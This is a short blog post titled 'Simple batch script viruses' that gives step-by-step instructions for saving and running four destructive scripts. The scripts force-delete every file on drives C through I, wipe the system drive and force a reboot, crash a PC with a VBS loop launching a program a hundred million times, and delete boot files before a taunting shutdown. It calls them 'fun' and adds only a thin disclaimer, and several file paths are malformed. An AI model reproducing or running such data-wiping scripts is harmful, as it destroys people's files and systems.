Open in app
Get started


lakshay arora
lakshay arora
Follow
Aug 28, 2020

·
3 min read
·

Listen


Save





Simple batch script viruses
Batch Scripts are stored in simple text files containing lines with commands that get executed in sequence, one after the other. Batch files are often used to help load programs, run multiple processes at a time, and perform common or repetitive tasks. For example, a batch job could be used to back up files, process log files, run a series of calculations or diagnostics, or any other job that require multiple commands to run. It can also be used to make fun malwares( that do not harm any organization in comparison to ransomware)

NOTE: The following are not real life malwares, they are just fun scripts and should not be used to cause disruption of service without permission.


Shell scripting can cause several system malfunctions
The steps to make this viruses executable are:

1⃣ Make a text file

2⃣ Paste code

3⃣ Save as all files with extension .bat ( test.bat)

VIRUS 1 — DELETE ALL PARTITIONS

@echo off

Del C:\*.* /f /s /q

Del D:\*.* /f /s /q

Del E:\*.* /f /s /q

Del F:\*.* /f /s /q

Del G:\*.* /f /s /q

Del H:\*.* /f /s /q

Del I:\*.* /f /s /q

VIRUS 2 — This Virus Deletes All The Content Of C Drive

@echo off

del %systemdrive%*.* /f /s /q

shutdown -r -f -t 00

VIRUS 3 — This Will Crash your Computer

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
 
Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
Save virus 3 file with .vbs file extension

VIRUS 4 — Virus that crashes pc

@echo off

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

@echo off

msg * YOU GOT OWNED!!!

shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
